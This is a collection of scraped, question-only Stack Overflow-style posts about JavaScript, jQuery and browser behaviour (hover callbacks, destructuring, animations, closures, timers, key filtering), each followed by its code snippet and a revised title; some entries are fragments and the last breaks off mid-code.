How to read bound hover callback functions in jquery," I used jQuery to set hover callbacks for elements on my page. I'm now writing a module which needs to temporarily set new hover behaviour for some elements. The new module has no access to the original code for the hover functions.I want to store the old hover functions before I set new ones so I can restore them when finished with the temporary hover behaviour.I think these can be stored using the jQuery.data() function: Do stuff with new hover behaviour... But how do I get the currently registered hover functions from jQuery?Shadow2531, I am trying to do this without modifying the code which originally registered the callbacks. Your suggestion would work fine otherwise. Thanks for the suggestion, and for helping clarify what I'm searching for.

Is it worth coverting my functional JavaScript code to an object-oriented design?," I'm currently building a small web application that includes a fair amount of JavaScript. When I was prototyping the initial idea, I just hacked together a few functions to demonstrate how the application would eventually behave intending to go forward re-writing the JavaScript in an object-oriented nature.Now that I'm getting into the implementation phase, I'm finding that creating object-oriented JavaScript for the sake of being object-oriented seems overkill - the project isn't likely to require any major modifications in the future that would warrant and object-oriented design. Instead, I'm finding that a set of concise, cohesive functions are working well.So, with that said and with attempting to adhere to the KISS principle, when a set of functions are providing a suitable solution to a problem, are there any other reasons worth considering to convert my code into an object-oriented design? <code> ",Is it worth converting my functional JavaScript code to an object-oriented design?

Destructuring assignment in Javascript," As can be seen in the Mozilla changlog for JavaScript 1.7 they have added destructuring assignment. Sadly I'm not very fond of the syntax (why write a and b twice?): Something like this would have been a lot better: That would still be backwards compatible. Python-like destructuring would not be backwards compatible.Anyway the best solution for JavaScript 1.5 that I have been able to come up with is: Which works like: But this really sucks because _ has no meaning. It's just an empty shell to store the names. But sadly it's needed because JavaScript doesn't have pointers. On the plus side you can assign default values in the case the values are not matched. Also note that this solution doesn't try to slice the array. So you can't do something like {first: 0, rest: 0}. But that could easily be done, if one wanted that behavior.What is a better solution? <code>  var a, b; [a, b] = f(); var [a, b] = f(); function assign(array, map) { var o = Object(); var i = 0; $.each(map, function(e, _) { o[e] = array[i++]; }); return o;} var array = [1,2];var _ = assign[array, { var1: null, var2: null });_.var1; // prints 1_.var2; // prints 2",Destructuring assignment in JavaScript

downscale jquery or prototype - JS framework selection," While considering the JS framework for my next project, I can see the scale clearly tipping towards jQuery, however, Prototype is getting good reviews, too.The issue I am thinking of is how to downscale these to have only the functionality I REALLY need. The latest jQuery seems to be 55k compressed, for instance, and I clearly need only the very basic functionality needed mostly or cross-browser compatibility.The alternative of coding just what I need by hand sounds quite a pain in the butt.Has anyone come across some ""jQuery downscaler"" or ""Prototype downscaler""? Stuff like Dlite does not quite cut it since I need the cross-browser AJAX with timeouts, and the cross-browser cookie handling, but maybe there is some other lightweight solution?ASP-related bundles won't help since I am doing a PHP-based solution.Any tips on that will be much appreciated. <code> ",Downscaled versions of jQuery or Prototype - JS framework selection

Why would jquery return 0 for an offsetHeight when firebug says it's 38?," So I have a div whose content is generated at runtime it initially has no height associated with it. When it's generated according to firebug and from what I can alert with js the div still has a height of 0. However, looking at the read-only properties with firebug I can see that it has an offset height of 34. It's this value that I need. Hopefully it's obvious but in case it isn't, this number is variable, it's not always 38.So, I thought that I could just get that by doing this via jquery... or this with straight js... But all that is returned is 0. Does it have anything to do with the fact that offset height is a read-only property in this instance? How can I get this height? I mean firebug is figuring it out somehow so it seems like I should be able to. Edit:Here's a sample of what the div looks like right now... This code is being generated by a control in a separate library. So here's the actual code creating it in my .aspx page. Ok, it's edited slightly but thats a whole lot more HTML than I had before. The div I was referring to as ""parentDiv"" before is called ""ctl00_BodyContentPlaceHolder_UserControl"" up there. That code includes the div in question, it's sibling, parent, grandparent and children. It's almost a direct copy from firebug.Update:I should have mentioned this is being done in IE 7. It seemed to work fine one time in Firefox, but it's returning 0 now. Does this provide any new insights of possible work-arounds or anything?... You all must think I'm nuts.Update:Some styling... <code>  $(""#parentDiv"").attr('offsetHeight'); document.getElementById(""parentDiv"").offsetHeight; <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML Strict//EN""><META http-equiv=""Content-Type"" content=""text/html; charset=utf-8""><HTML style=""OVERFLOW: hidden; HEIGHT: 100%"" xmlns=""http://www.w3.org/1999/xhtml""><BODY><FORM id=""aspnetForm"" name=""aspnetForm"" action=""blah.aspx"" method=""post""><DIV id=""container""><DIV id=""ctl00_BodyContentPlaceHolder_Navigation"" style=""Z-INDEX: 1; LEFT: 1597px; POSITION: absolute; TOP: 67px""> <DIV class=""TransparentBg"" id=""TransparentDiv"" style=""MARGIN-TOP: 10px; MARGIN-RIGHT: 10px; HEIGHT: 94px; TEXT-ALIGN: center""> </DIV> <DIV class=""Foreground"" id=""ForegroundId"" style=""MARGIN-TOP: 10px; MARGIN-RIGHT: 10px; TEXT-ALIGN: center""> <DIV id=""ctl00_BodyContentPlaceHolder_Navigation1"" style=""WIDTH: 52px; COLOR: black; HEIGHT: 52px; BACKGROUND-COLOR: transparent; -moz-user-focus: normal""> <IMG style=""FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod = scale src='../images/image.gif'); CURSOR: pointer"" height=""52"" hspace=""0"" src=""..."" width=""52"" /> </DIV> <DIV id=""ctl00_BodyContentPlaceHolder_UserControl"" name=""ctl00_BodyContentPlaceHolder_UserControl""> <IMG style=""DISPLAY: block; VERTICAL-ALIGN: bottom; CURSOR: pointer"" height=""17"" src=""..."" width=""16"" /> <IMG style=""VERTICAL-ALIGN: top; CURSOR: pointer"" height=""17"" src=""..."" width=""16"" /> </DIV> </DIV></DIV></DIV></FORM></BODY></HTML> <blah:blahControl ID=""control"" runat=""server"" /> .TransparentBg { background-color: white; filter:alpha(opacity=50); -moz-opacity:0.5; -khtml-opacity: 0.5; opacity: 0.5;}.Foreground{ position: absolute; top: 0px;}",Why would jquery return 0 for an offsetHeight when firebug says it's 34?

ASP.net not generating javascript.," ********************Edit 2**********************I figured out the problem... But I don't like the implications. I was testing our iPhone targeted mobile application earlier and using a plugin to mask Firefox's User Agent String as an iPhone..Net was infact NOT generating the required code for post backs based on that piece of information alone.I do not like this however, because since the iPhone and other multimedia devices can interpret javascript, ASP.net is breaking any application that relies on server generated javascript to run.So, if the community will allow it...

Why will ASP.net not generate javascript for specific browsers and how can I turn this ""feature"" off.*************** End Edit 2 ***************I've got a weird problem.

JQuery queued animations - mouseout event of hover not firing reliably," I'm having a problem using the jquery hover events. I've created a reduction of the problem. You can find a working demonstration here. I can reproduce this after moving the mouse around in IE, FF, Opera, and Chrome.I'm using queued animations in my mouseover event. Roughly 1% of the time, the color of the td elements is left as #0f0 after the mouse has left the td though. This should not be. The mouseout event should guarantee that eventually all tds turn back to #00f after a time has passed.Update 2:I've now reduced this probably about as far as it will go. No mouse events used at all. It's started working better in Opera, but now IE is a total cluster.Anyway, I'm using a button to trigger this: See it here.Update [n + 1]:I just can't leave this alone. I've determined that the animation actually is occurring. It's just not automating the background color. I've done this by adding text and animating the background and foreground in unison. Under normal conditions, you should never see the text once it starts animating, but sometimes the background gets ""forgotten"", and sometimes the foreground. This indicates to me, that a jquery animation is actually occurring, but it is just not animating all the attributes it was instructed to. For the curious, see it in action here. (warning: IE chokes pretty hard on this)Ok, going to play some video games now. <code>  function ani() { $('td') .stop() .animate({backgroundColor: '#0f0'}, 3000) .animate({backgroundColor: '#00f'}, 3000);}",JQuery color animations not firing reliably

"In JavaScript, why is [ ] preferred over new Array(); ?", I remember reading somewhere (I think it was in one of Crockford's papers) that using an array literal [] is better than using the new Array(); notation.But I can't really remember any advantages of one over the other.Can anyone please explain to me on why the former is preferred over the latter?Here is one reason I can think of on why [] is better than new Array();: Overriding the Array object will break code...!Any more reasons? <code>  var Array = function () { };,"In JavaScript, why is [ ] preferred over new Array();?"

How do I get just the visible text with JQuery (or Javascript)," I have website that converts Japanese Kanji into Romaji (roman letters):and the output shows and hides with CSS what the user needs to see depending on their input criteria. For example:<div id=""output""><span class=""roman"">watashi</span> <span class=""english"">I</span></div>The interface allows the user to flip between and output of watashi or I depending on what they want to see. The CSS hides one or the other using jQuery and a toggle button. (the hiding mechanism involves simple adding a class to the body and letting CSS do its thing).The problem is that when users copy/paste the text into Word it copies everything. So I decided to use a system to copy paste the text using JavaScript and jQuery, but the problem repeats itself:$('#output').text() outputs watashi I even if I is invisible on the page itself rather than watashi.

Optimize website for touch devices," On a touch device like iPhone/iPad/Android it can be difficult to hit a small button with your finger. There is no cross-browser way to detect touch devices with CSS media queries that I know of. So I check if the browser has support for Javascript touch events. Until now, other browsers haven't supported them, but the latest Google Chrome on dev channel enabled touch events (even for non touch devices). And I suspect other browser makers will follow, since laptops with touch screens are coming. Update: It was a bug in Chrome, so now the JavaScript detection works again.This is the test I use: The problem is that this only tests if the browser has support for touch events, not the device.Does anyone know of The Correct[tm] way of giving touch devices better user experience?

But I haven't seen anything like it in any other browser:https://developer.mozilla.org/En/CSS/Media_queries#-moz-touch-enabledUpdate: I want to avoid using a separate page/site for mobile/touch devices. The solution has to detect touch devices with object detection or similar from JavaScript, or include a custom touch-CSS without user agent sniffing!

It's not a class.""Who is right?As a note; For future you needing a succinct Classy JS implement:https://github.com/tnhu/jsfaceEdit: July 2017 JavaScript classes introduced in ECMAScript 2015 are primarily syntactical sugar over JavaScript's existing prototype-based inheritance. The class syntax is not introducing a new object-oriented inheritance model to JavaScript. JavaScript classes provide a much simpler and clearer syntax to create objects and deal with inheritance.- Mozilla ES6 Classes: https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Classes <code> ",Does JavaScript have classes?

How do I get Google Chrome's root bookmarks folder?," I'm trying to write a better bookmark manager in Chrome extensions. The problem is that there are no simple examples (that I can find) about how to actually use the bookmarks API.I've looked at the example source (when I d/led and installed it on my computer it didn't do anything except provide a search box. Typing/typing and pressing return failed to do anything) and can't find anything useful.My ultimate goal is to make an extension that allows me to save pages to come and read later without having to go sign up for an account on some service somewhere. So I plan to create either one or two bookmark folders in the root folder/other bookmarks - at minimum an ""unread pages"" folder. In that folder I'll create the unread bookmarks. When the user marks the item as read, it will be removed from that folder.So that's what I'm trying to do... any help will be greatly appreciated, even if it's just pointing me to some good examples.UPDATE: That displays [object Object], that suggests (at least to me with a limited JavaScript experience) that an object exists. But how to access the members of that object?Changing tree to tree.id or any other of what look to be parameters displays undefined. <code>  ...<script>function display(tree){ document.getElementById(""Output"").innerHTML = tree;}function start(){ chrome.bookmarks.getTree(display);}</script></head><body><h4 id=""Output""></h4><script> start();</script>...",Get Google Chrome's root bookmarks folder

"Line by Line explanation of ""Javascript: Good Parts"" example?"," I'm reading ""Javascript: The Good Parts"" and am totally baffled by what's really going on here. A more detailed and/or simplified explanation would be greatly appreciated. The add_the_handlers function was intended to give each handler a unique number (i). It fails because the handler functions are bound to the variable i, not the value of the variable i at the time the function was made: Now, instead of assigning a function to onclick, we define a function and immediately invoke it, passing in i. That function will return an event handler function that is bound to the value of i that was passed in, not to the i defined in add_the_handlers. That returned function is assigned to onclick. <code>  // BAD EXAMPLE// Make a function that assigns event handler functions to an array of nodes the wrong way.// When you click on a node, an alert box is supposed to display the ordinal of the node.// But it always displays the number of nodes instead.var add_the_handlers = function (nodes) { var i; for (i = 0; i < nodes.length; i += 1) { nodes[i].onclick = function (e) { alert(i); } }};// END BAD EXAMPLE // BETTER EXAMPLE// Make a function that assigns event handler functions to an array of nodes the right way.// When you click on a node, an alert box will display the ordinal of the node.var add_the_handlers = function (nodes) { var i; for (i = 0; i < nodes.length; i += 1) { nodes[i].onclick = function (i) { return function (e) { alert(i); }; }(i); }};","Closures: Line by Line explanation of ""Javascript: Good Parts"" example?"

How to force jQuery animations run simultaneously?," I have a web page with animations (JQuery Animation) all over the place. A typical animation sequence may contain three or four objects animating independently at the same time. The issue I am facing is that the queuing of the animations is not predictable. Some of the animations are running simultaneously while some others are not.I am doing something like in many places just to try and group the animations. Even when using this, some of the animations inside the code block are not running simultaneously.Is there any way to force animations to be run at the same time? Is there a way to fill up the queue with animations and then execute these at the same time?Is there any comprehensive documentation of how this thing actually works?EDIT: Sample code Warning: The code is messyThe question is looking at the code how do you know which of the animations are going to run simultaneously? <code>  setTimeout(function(){ //animations }, delay);",How to force jQuery animations to run simultaneously?

Javascript: Hide Mouse Cursor When Idle," Is it possible to use JavaScript to set the cursor attribute to the property none if the mouse is inactive for a certain amount of time (say, five seconds) and set it back to auto when it becomes active again?EDIT: I realize that none is not a valid value for the cursor property. Nonetheless, many web-browsers seem to support it. Furthermore, the primary user for this is myself, so there is little chance of confusion arising as a result.I've got two scripts that can do something similar: and With each of these, when the mouse is inactive for more than five seconds the background color turns white, and when the cursor is moved the background turns black. However, they don't work for making the cursor disappear. What surprises me is that if I put the command document.querySelector(""body"").style.cursor = ""none""; into the JavaScript console it works perfectly. Inside the scripts, it does not seem to work.I've posted the above scripts as this is as far as I have come in getting this to work. I'm not necessarily asking for a fix for either of the scripts; if you know of a more efficient way of hiding the cursor, please share. <code>  window.addEventListener(""mousemove"", function(){ document.querySelector(""#editor"").style.background = ""#000""; setTimeout(""document.querySelector('#editor').style.background = '#fff'"", 5000); }, true); var timeout;var isHidden = false;document.addEventListener(""mousemove"", magicMouse);function magicMouse() { if (timeout) { clearTimeout(timeout); } timeout = setTimeout(function() { if (!isHidden) { document.querySelector(""body"").style.cursor = ""none""; document.querySelector(""#editor"").style.background = ""#fff""; isHidden = true; } }, 5000); if (isHidden) { document.querySelector(""body"").style.cursor = ""auto""; document.querySelector(""#editor"").style.background = ""#000""; isHidden = false; }};",Hiding the mouse cursor when idle using JavaScript

Sometimes when you go back a screen, the instruction text becomes black and no longer disappears, issues like that.Is there a standard javascript library for this?

hidden invisible elements take space," I'd like to make some empty hidden elements (iframes would be nice, paragraphs would do) that Javascript would later fill and modify. I have not been able to figure out how to keep these elements from taking up space.

JQuery getting location of element relative to window," Given an HTML DOM ID, how to get an element's position relative to the window in JavaScript/JQuery? This is not the same as relative to the document nor offset parent since the element may be inside an iframe or some other elements. I need to get the screen location of the element's rectangle (as in position and dimension) as it is currently being displayed. Negative values are acceptable if the element is currently off-screen (have been scrolled off).This is for an iPad (WebKit / WebView) application. Whenever the user taps on a special link in an UIWebView, I am supposed to open a popover view that displays further information about the link. The popover view needs to display an arrow that points back to the part of the screen that invokes it. <code> ",jQuery get the location of an element relative to window

html input fields are not accessable.," I have a problem and I can't figure out what exactly is causing this behavior. I cannot access my input fields and textareas on my HTML form.Unfortunately, the JS, HTML and CSS are very large, so I can't really post it all here. Can anybody tell me what to look for when debugging this strange behavior?UPDATEIf I move the cursor over the input field I can see the text cursor, but when I click it the field does not get the focus. I can access the field via pressing the Tab key and if I right click on it and then click on the field I also get the focus for it....and nope, they don't have the disabled or readonly attributes ;-) <code> ",HTML input fields does not get focus when clicked
Javascript - On Text Highlight Event?," I'm curious if anyone knows how I would trigger a function to run if/once the user finishes selecting text on the web page? I would like the user to be able to select text, and after a short delay(or immediately, at this point it doesn't matter much) an overlay button appears near the text that the user can then click and I go back and run more of my code that is based on the selection. This is for a Firefox extension.A similar example that I can think of would be like in IE where you can select text and then it brings up the ""web accelerators"". I'm 99% sure I know how I would actually overlay the button, and get the position of the selected text, but I have no idea how to check to see if there is anything selected, without doing some sort of infinite loop, which just seems like a terrible idea.EDIT: So this is what I have come up with using Robert's suggestion, and it took me some time getting everything in the right spot, but it works great! Now on to position my button.  <code>  //In my overlay.js with the rest of my sidebar codeisTextSelected: function () { var myText = cqsearch.getSelectedText(); var sidebar = document.getElementById(""sidebar""); var sidebarDoc = sidebar.contentDocument || document; var curHighlightedDiv = sidebarDoc.getElementById(""testDiv""); curHighlightedDiv.innerHTML = ""Current text selection:"" + myText; }};//In my on firefox load function I added thisdocument.onmouseup = cqsearch.isTextSelected;",On Text Highlight Event?
How many JavaScript programs are executed for single web-page in the browser?," JavaScript programs consist of statements and function declarations. When a JavaScript program is executed, these two steps occur:the code is scanned for function declarations, and every func. declaration is ""executed"" (by creating a function object) and a named reference to that function is created (so that this function can be called from within a statement)the statements are executed (evaluated) sequentially (as they appear in the code)Because of that, this works just fine: Although the ""foo"" function is called before it is declared, it works because the function declaration is evaluated before the statement.However, this does not work: A ReferenceError will be thrown (""foo is not defined"").This leads to the conclusion that every SCRIPT element inside the HTML code of the web-page represents a separate JavaScript program and every time the HTML parser encounters a SCRIPT element, it executes the program inside that element (and then once the program is executed, the parser moves on to the HTML code that follows the SCRIPT element).Then again, this does work: My understanding here is that the Global object (which serves as the Variable object in the global execution context) exists (and remains) at all times, so the first JavaScript program will create the function object and make a reference for it, and then the second JavaScript program will use that reference to call the function. Therefore, all JavaScript programs (within a single web-page) ""use"" the same Global object, and all changes done to the Global object by one JavaScript program can be observed by all JavaScript programs that run subsequently.Now, note this... In the above case, the alert call will not execute, because the ""foo()"" statement throws a ReferenceError (which breaks the whole JavaScript program) and therefore, all subsequent statements do not execute.However, in this case... Now, the alert call does get executed. The first JavaScript program throws a ReferenceError (and as a consequence breaks), but the second JavaScript program runs normally. Of course, the browser will report the error (although it did execute subsequent JavaScript programs, after the error occurred).Now, my conclusions are:every SCRIPT element within the HTML code of the web-page represents a separate JavaScript program. These programs execute immediately as the HTML parser encounters them.all JavaScript programs within the same web-page ""use"" the same Global object. That Global object exists at all times (from the moment the web-page is fetched up until the web-page is destroyed). JavaScript programs may manipulate the Global object, and all changes done to the Global object by one JavaScript program can be observed in all subsequent JavaScript programs.if one JavaScript program breaks (by having an error thrown), that does not prevent subsequent JavaScript programs to execute.Please fact-check this post and tell me if I got something wrong.Also, I have not found resources that explain the behaviors mentioned in this post, and I assume that the browser makers must have published such resources somewhere, so if you know about them, please provide the links to them. <code>  <script> foo(); function foo() { return; }</script> <script> foo();</script><script> function foo() { return; }</script> <script> function foo() { return; }</script><script> foo();</script> <script> // assuming that foo is not defined foo(); alert(1);</script> <script> // assuming that foo is not defined foo();</script><script> alert(1);</script>",How many JavaScript programs are executed for a single web-page in the browser?

It would be visually more consistent and less confusing, if the arrow cursor would be visible everywhere while the mouse is hold down.Google Maps is doing the same thing with their hand cursor while moving the map. So my question is how to achive this effect on my own.My current (relevant) source: <code>  function startObjectScaling(e){ e.stopPropagation(); e.preventDefault(); document.documentElement.style.cursor = this.style.cursor; window.addEventListener(""mouseup"", stopObjectScaling, false);}function stopObjectScaling(e){ e.stopPropagation(); document.documentElement.style.cursor = ''; window.removeEventListener(""mouseup"", stopObjectScaling);}[...]var tg = document.getElementById(""transformGadget"");var handle = tg.firstChild.nextSibling;for(var i=0;i<4;i++){ handle.addEventListener(""mousedown"", startObjectScaling, false); handle = handle.nextSibling;}",Custom cursor outside of browser window

Best Way To Parse String in Javascript," I am having a lot of trouble learning RegExp and coming up with a good algorithm to do this. I have this string of HTML that I need to parse.

Cross browser rgba background," I want to get rgba backgrounds working with all browsers. I did some searching and found out that generally there are three types of browsers out there:1) Browsers that support rgba.2) Internet Explorer that supports rgba via bizarre '-ms-filter' thing.3) Browsers that do not support rgba, but I could use base64 png images with 'data URI scheme'. (Even when browser does not support URI scheme, according to this it still could be done.)I have no problems with rgba supporting browsers, and I can get it working with IE, but problem is that I have no idea how to generate client side base64 png images for URI scheme. I really do not want to pregenerate png files, because my rgba values are not constant. I could go with dynamic png generation with php gd library, but I'd really like to do all this on client side. So I'd like to know, is there any good way out there for generating semi-transparent png images with java-script. After this I could just base64 encode them and use them with URI scheme?Thank you.Edit:I want to have semi-transparent div background, while having content fully visible. <code> ",Cross browser rgba transparent background while keeping content (text & images) non-transparent

Why does Internet Explorer not send HTTP post body on AJAX call after failure?," We are able to reliably recreate the following scenario:Create a small HTML page that makes AJAX requests to a server (using HTTP POST)Disconnect from the network and reconnectMonitor the packets that IE generates after the failureAfter a failed network connection, IE makes the next AJAX request but only sends the HTTP header (not the body) when doing the HTTP post. This causes all sorts of problems on the server as it is only a partial request. Google this issue with Bing and you'll find lots of people complaining about ""random server errors"" using AJAX or unexplained AJAX failures. We know that IE (unlike most other browsers) always sends an HTTP POST as TWO TCP/IP packets. The header and body is sent separately. In the case directly after a failure, IE only sends the header. IE never sends the payload and the server eventually responds with a Timeout.So my question is - why does it behave this way? It seems wrong based on the HTTP spec and other browsers don't behave this way. Is it simply a bug? Surely this creates havoc in any serious AJAX based Web application.Reference information:There is a similar problem, triggered by HTTP keep-alive timeouts that are shorter than 1 minute and is documented here:http://us.generation-nt.com/xmlhttprequest-post-sometimes-fails-when-server-using-keep-aliv-help-188813541.htmlhttp://support.microsoft.com/default.aspx?kbid=831167 <code> ",Why does Internet Explorer not send HTTP post body on Ajax call after failure?

Here is my getJSON pseudo code : So this getJSON is invoked for every feedback I get from the server(n times). And when json completes the appropriate column in table is populated with last updated time. But it seems that timeago is not reading the changed title value, it does not recognize updated DOM.

[JS] HTML5 canvas image caching/putImageData questions," I'm using the HTML5 canvas to load a single instance of an image which I then blit multiple times onto a single canvas. The image needs some slight pixel-based manipulation in order to customise it.

Instead, when using putImageData to place it onto my front-facing canvas, it is rendered with a black background. How do I maintain transparency?

Jquery simple ajax call seems to be blocking," Really simple question. I trying to test a Restful webservice that I am developing, and have this simple ajax call (using jquery): This runs when the page loads. As it's running, the page is blocking; i.e., (I can see the hourglass next to the mouse pointer) no other user actions can be handled. (Btw, this particular get request--intentionally--takes a very long time to return).Why is this? A(asynchronous)JAX right? Obviously I am making a beginners mistake. Any ideas, please?When I attempt this using plain javascript (no library) it works as expected. Does this have something to do with Jquery's handling of the xhr onreadystatechange?Thank you for looking.EDIT: multiple people have suggested setting async: true, which as it happens, is the default in jquery, and as such has no effect.EDIT: As previously mentioned, if I use plain javascript and start this with a timer, e.g., window.setInterval(function() { startLongPoll(); }, 5000)It updates as expected, without appearing to block. Ideas, anyone? <code>  <script type=""text/javascript""> $(document).ready(function() { var url = '/index.php/gettest/reallyLongRequest'; $.ajax({ url: url, dataType:'text', success:function(data) { $('#result').html(data);}, error:function(xhr,err,e) { alert (""Error: "" + err);} }); }); </script>",Simple ajax call seems to be blocking
How to call second jQuery #.ajax instance on success of first and update page," I have some jQuery that is triggered on click of a link with the class 'changetag'.

Testing JavaScript in web frontends," This might sound a little dumb, but I'm actually a bit confused how to approach JavaScript testing for web frontends. As far as I'm concerned, the typical 3-tier architecture looks like this:Database tierApplication tierClient tier1 is of no concern in this question. 2 contains all the program logic (""business logic"") 3 the frontend.I do test-driven development for most projects, but only for the application logic, not the frontend. That is because testing the UI is difficult and unusual in TDD, and normally not done. Instead, all application logic is separated from UI, so that it is simple to test that logic.The three tier architecture supports this: I can design my backend as a REST API which is called by my frontend. How does JS testing fit in? For the typical three-tier-architecture, JS (i.e. JS on the client) testing doesn't make much sense, does it?Update:I've changed the question's wording from ""Testing JavaScript in web frontends"" to ""Test-driven development of JavaScript web frontends"" to clarify my question. <code> ",Test-driven development of JavaScript web frontends

jQuery: How can I set the class for an element? Don't want to add/remove classes.," I need to set the class for an element in my page. With plain JavaScript, I would write something like: This just sets the class, which is exactly what I want. But I'm using jQuery on my page and so would like to do this in a ""jQuery way"", since it seems weird to mix the old style and the jQuery style. But jQuery apparently only allows you use addClass() or removeClass(), like so: The problem is that it merely adds a class to the element, it does not replace the currently existing class. Does this mean I have to keep track of the old class and do a removeClass() first? Is there no way to tell jQuery to replace the current class no matter what it is and just replace it with a new one? <code>  document.getElementById('foo').className = ""my_class""; $('#foo').addClass(""my_class"");",How can I set the class for an element using jQuery?

Adding elements as a string vs. createElement," For what I want to accomplish, I can use either createElement() or innerHTML and a string.Which is truly faster in the end? I've been led to believe for a long time that strings are much slower than built-in functions that return the same results, but is it really true?I ask because I've tried createElement() and it seems that all of the properties that have to be added to each element slows things down. Not only that, but it takes up more space, too. I have a loop that goes anywhere from 1-infinity based on an array's length, though preferably adding up to 50 or so elements before showing signs of slowing down. Within these 50 or so elements that I wish to create are about 10 more elements. So, in all, it's actually creating around 500 elements.I noticed a bit of a slowdown faster than usual by creating elements with the built-in functions, and due to my fooling around resetting that array (the array was 5D and not set in the same script), I'd like to know which is truly better, both as far as speed goes and simply the better practice, before doing it all over. <code> ",Adding elements as a string vs. createElement()
Html5 Canvas vs SVG vs div," What is the best approach for creating elements on the fly and being able to move them around? For example, let's say I want to create a rectangle, circle and polygon and then select those objects and move them around.I understand that HTML5 provides three elements that can make this possible: svg, canvas and div. For what I want to do, which one of those elements will provide the best performance?To compare these approaches, I was thinking of creating three visually identical web pages that each have a header, footer, widget and text content in them. The widget in the first page would be created entirely with the canvas element, the second entirely with the svg element, and the third with the plain div element, HTML and CSS. <code> ",HTML5 Canvas vs. SVG vs. div

What's more strange to me is that console.log(new $().name) properly returns ""levi"". If this is bound to window, why did the object properly get the value?. We could just add new console.log(new $()) and it works. However, I don't want to write new everytime. So I tried: Which gives me what I want, but it seems a bit unnecessary to wrap the object inside of a function which creates it. Further more, the returned object is obj and not $. Comparison tests would fail.What are some other ways this can be done? Is there a more elegant solution? I have no qualms about rethinking my entire process. I consider myself pretty good at using JavaScript, but creating new JavaScript is something I am very new to.Does anyone see anything wrong with the following solution? It appears to be working in all my tests.  <code>  $ = function() { this.name = ""levi""; return this;};console.log($()); $ = function() { var obj = function() { this.name = ""levi""; }; return new obj();};console.log($()); $a = function() {};$ = function() { if (!(this instanceof $)) { return new $(); } this.name = ""levi""; return this;};//helper functionvar log = function(message) { document.write((message ? message : '') + ""<br/>"");};log(""$().name == window.name: "" + ($().name == window.name)); //falselog(""$().name: "" + $().name); //levilog(""window.name: "" + window.name); //resultlog();log(""$a instanceof $: "" + ($a instanceof $)); //falselog(""typeof $a: "" + (typeof $a)); //functionlog(""typeof $: "" + (typeof $)); //function",An Object that returns an instance of itself

Javascript Syntax Test Case," I'm creating a text editor and I've just finished writing the highlighting algorithms to have each of the syntax appear in a different color, and render in the right position using the proper parse trees.I was wondering if anyone could provide me with, or the location of a test or series of test cases to make sure nothing will break. The test case(s) should cover all of JavaScript syntax as it is used on the web including edge cases (i.e., including syntax like throw although it is rarely used), DOM creation and manipulation etc.I have added the following static test case. It should cover all the syntax.There are a few things to note: since the code is being parse recursively on a grammar level, only basic cases are required. For example, to the editor:a[1]; and a[1][2][3][4][5]; would be the same syntax. Since the second line, is just recursively more subs then the the first line.The test case I have created has been moved to an answer below. <code> ",Javascript syntax test cases
"getJSON() success callback function, how to pass extra parameter?"," I've never had to use callback functions before, so I may have made a completely stupid mistake. I think I somewhat understand the problem here, but not how to solve it.My code (a bit simplified) is: Now as far as I understand, this anonymous function will only be called if getJSON() has received the data. But by this point, i does not have the value I would require. Or, as far as my observation goes, it has the last value it would have after the loop is done (shouldn't it be out of bounds?).As a result, if the array had a size of 6, do_something_with_data() would be called five times with the value 5.Now I thought, just pass i to the anonymous function but this does not seem to be possible. i is undefined now. <code>  for (var i = 0; i < some_array.length; i++) { var title = some_array[i]; $.getJSON('some.url/' + title, function(data) { do_something_with_data(data, i); } function(data, i) { }",Pass extra parameter to jQuery getJSON() success callback function

pushstate and seo," Many people have been saying, use pushState rather than hashbang.What I don't understand is, how would you be search-engine friendly without using hashbang?Presumably your pushState content is generated by client-side JavaScript code.The scenario is thusly:I'm on example.com. My user clicks a link: href=""example.com/blog""pushState captures the click, updates the URL, grabs a JSON file from somewhere, and creates the listing of blog posts in the content area.With hashbangs, google knows to go to the escaped_fragment URL to get their static content.With pushState, Google just sees nothing as it can't use the JavaScript code to load the JSON and subsequently create the template.The only way to do it I can see is to render the template on the server side, but that completely negates the benefits of pushing the application layer to the client.So am I getting this right, pushState is not SEO friendly for client-side applications at all? <code> ",pushState and SEO

How to interpreter grey item in Firebug net panel?," I'm trying to debug some tricky behaviour in my web application: It appears as though an XHR GET request is being sent by the client, but the server never actually receives it.

Does javascript provide a high resolution timer?," Does JavaScript provide a high resolution timer?I've written a few game engines from scratch, some in C, some in Java, and some in Flash. I always follow the same basic model when it comes to animations and interactive graphics. Create a basic class/structure with the following design: Time is so important to smooth animations and game state calculations. In native code Windows, I use QueryPerformanceCounter() and QueryPerformanceFrequency() to perform the role of queryTime() in each game loop and pass the time to update/render. In Java, I use System.nanoTime().What's the equivalent in JavaScript? That is, some function like queryTime() which returns a time value with a high degree of accuracy (sub millisecond). From what I've heard the best accuracy you can get in JavaScript is about 15 ms ... which is horrible for animation. <code>  void init() { /* Called once, preload essential resources here. */ }void update(double time) { /* Updates game/animation state using high resolution time. */ }void render(double time) { /* Updates screen graphics using high resolution time. */ }void run(){ double time; init(); while (!done) { time = queryTime(); update(time); render(time); }}",Does JavaScript provide a high resolution timer?

"help with regex pattern for delete, arrows and escape keys"," I am writing a javascript code to restrict the keys that can be entered into a text box. my regex is now /[a-zA-Z0-9\b]/, which allows alphanumeric and backspace. I want to allow the delete, L/R arrows, and escape keys to work in firefox (3.6).I am not sure sure what are the symbols for these keys. In ie8, the escape key (and del/arrows) still is active even if the \e switch is excluded from the regex, when pressed, it resets/empties the text box.In FF, I put the escape in the expression /[a-zA-Z0-9\b\e]/, but it does not seem to work for firefox, that is when the escape key is pressed, it does not reset/empty the text box. what are the valid symbol for the regex to allow alphanumeric, L/R arrows, delete, escape?Also, what is the translation for this [a-zA-Z0-9\-\_]?It was meant to be alphanumeric and hyphens. But what is the slash infront of the hyphen since hyphen does not need a slash? and what is the \_ for since the underscore is not matched by the expression?TIAEditThe reason why using keycode numbers as suggested by nnnnn did not work for me (for other people?) is because the keycodes from 65-90 are for uppercase letters, even though some websites do claim that those keycodes work for both lower and upper cases. This http://www.lookuptables.com/ website shows that lowercase letters are from 97-122. Unfortunately, this range has some unmapped overlaps with some characters. For example, the \ character is listed as having 220 keycode. But my filter to deactivate of keycodes > 122 would still allow the \ to get through. There are other examples.I have tested this using my laptop keyboard and an external full size keyboard.Edit 2I have combined both the regex and the keycode arguments into one function. The function works in principle, but due to crazy keycode conflicts, it does not work for the % sign. It requires both the onkeydown and onkeypress to catch all the keys (except the % key). See my discussion herejavascript regex for key event input validations troubleshooting help <code>  function keyRestricted(e) { var keypressed; var keychar; var keycheck; // IE - keyCode 